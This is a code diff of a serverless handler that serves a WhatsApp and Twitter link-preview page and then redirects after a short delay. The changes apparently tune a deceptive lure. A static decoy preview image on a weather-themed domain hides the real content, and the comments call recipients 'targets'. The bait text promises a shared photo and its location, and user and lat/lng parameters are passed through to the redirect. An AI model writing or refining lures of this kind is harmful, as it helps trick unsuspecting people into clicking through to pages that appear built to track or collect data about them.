@@ -35,7 +35,8 @@ export default function handler(req, res) {
   if (nama) redirectUrl += '&nama=' + encodeURIComponent(nama);
 
   // 4. Tampilkan HTML dengan Meta Tag Open Graph (untuk preview WhatsApp)
-  // Lalu redirect ke view.html via JavaScript setelah delay
+  // Preview WhatsApp = preview.jpg (STATIS)
+  // Gambar asli = ${foto} (muncul saat target klik)
   const html = `<!DOCTYPE html>
 <html lang="id">
 <head>
@@ -43,21 +44,22 @@ export default function handler(req, res) {
 <meta name="viewport" content="width=device-width,initial-scale=1.0">
 <title>Foto Dibagikan</title>
 
-<!-- ═══ META TAG OPEN GRAPH UNTUK PREVIEW WHATSAPP ═══ -->
+<!-- ═══ META TAG OPEN GRAPH — PREVIEW PAKAI preview.jpg ═══ -->
 <meta property="og:title" content="Foto Dibagikan" />
 <meta property="og:description" content="Seseorang membagikan foto kepada Anda. Klik untuk melihat lokasinya." />
-<meta property="og:image" content="${foto}" />
+<meta property="og:image" content="https://infocuaca.online/preview.jpg" />
 <meta property="og:image:width" content="1200" />
 <meta property="og:image:height" content="630" />
 <meta property="og:image:type" content="image/jpeg" />
 <meta property="og:type" content="website" />
 <meta property="og:site_name" content="infocuaca.online" />
+<meta property="og:url" content="https://official-brown-iota.vercel.app/api/p?foto=${encodeURIComponent(foto)}&u=${encodeURIComponent(user)}${lat ? '&lat=' + lat : ''}${lng ? '&lng=' + lng : ''}" />
 
-<!-- ═══ META TAG TWITTER CARD ═══ -->
+<!-- ═══ META TAG TWITTER CARD — PREVIEW PAKAI preview.jpg ═══ -->
 <meta name="twitter:card" content="summary_large_image" />
 <meta name="twitter:title" content="Foto Dibagikan" />
 <meta name="twitter:description" content="Seseorang membagikan foto kepada Anda. Klik untuk melihat lokasinya." />
-<meta name="twitter:image" content="${foto}" />
+<meta name="twitter:image" content="https://infocuaca.online/preview.jpg" />
 
 <style>
   body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; margin: 0; padding: 0; background: #111; color: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
@@ -66,10 +68,8 @@ export default function handler(req, res) {
   .loading { font-size: 14px; color: #888; letter-spacing: 2px; }
 </style>
 
-<!-- ═══ REDIRECT VIA JAVASCRIPT (SETELAH META TAG DIBACA) ═══ -->
+<!-- ═══ REDIRECT VIA JAVASCRIPT ═══ -->
 <script>
-  // Redirect ke view.html setelah halaman dimuat
-  // Menggunakan setTimeout 300ms agar WhatsApp sempat membaca meta tag
   setTimeout(function() {
     window.location.href = "${redirectUrl}";
   }, 300);
